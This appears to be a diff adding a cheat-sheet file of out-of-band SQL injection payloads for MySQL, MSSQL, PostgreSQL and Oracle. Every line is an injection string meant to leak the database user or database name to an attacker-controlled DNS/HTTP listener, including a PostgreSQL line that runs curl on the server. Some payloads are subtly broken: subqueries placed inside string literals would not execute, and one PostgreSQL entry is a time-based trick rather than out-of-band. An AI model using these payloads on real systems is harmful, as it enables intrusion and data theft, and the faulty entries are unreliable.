@@ -1,0 +1,19 @@
+# Modern Out-of-Band (OOB) SQLi Payloads
+# Replace 'YOUR_HOST' with your DNS/HTTP listener (e.g., Burp Collaborator, dnslog.cn)
+
+# MySQL (Windows only for LOAD_FILE SMB)
+' AND LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.YOUR_HOST\\a'))-- -
+' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.YOUR_HOST\\a'))-- -
+
+# MSSQL
+'; EXEC master..xp_dirtree '//(SELECT user_name()).YOUR_HOST/a'--
+'; EXEC master..xp_fileexist '//(SELECT db_name()).YOUR_HOST/a'--
+
+# PostgreSQL
+'; COPY (SELECT 'oob') TO PROGRAM 'curl http://(SELECT current_user).YOUR_HOST'--
+'; CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep(5);--
+
+# Oracle
+' AND 1=utl_http.request('http://YOUR_HOST/'||(SELECT user FROM dual))--
+' AND 1=utl_inaddr.get_host_address((SELECT user FROM dual)||'.YOUR_HOST')--
+' AND 1=HTTPURITYPE('http://YOUR_HOST/'||(SELECT user FROM dual)).getclob()--
